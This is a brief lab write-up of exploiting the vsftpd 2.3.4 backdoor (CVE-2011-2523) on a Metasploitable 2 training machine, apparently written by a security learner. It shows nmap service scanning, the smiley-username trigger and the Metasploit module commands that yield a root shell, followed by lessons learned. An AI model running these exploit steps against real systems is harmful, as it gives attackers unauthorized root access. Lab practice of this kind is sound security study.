# vsftpd 2.3.4 Backdoor

**Target:** Metasploitable 2 | **CVE:** CVE-2011-2523  
**Tools used:** Nmap, Metasploit

---

## What happened

Ran Nmap against Metasploitable to see what was running:

```bash
nmap -sV 192.168.1.91
```

Found vsftpd 2.3.4 on port 21. That version has a backdoor — someone injected it into the source code in 2011. When you send a username with `:)` in it, the server opens a root shell on port 6200. Metasploit has a module for it.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.91
set LHOST 192.168.1.80
run
```

Got a Meterpreter session, dropped into shell, ran `whoami` — root.

---

## What I learned

- Nmap with `-sV` shows service versions, not just open ports. The version is what matters for finding CVEs.
- The vsftpd backdoor wasn't a bug — someone intentionally put it in the source code. That's a supply chain attack.
- Metasploit handles the whole exploit once you point it at the target. The module sends the malformed username and connects back automatically.
- `shell` inside Meterpreter drops you into a system shell where normal Linux commands work.
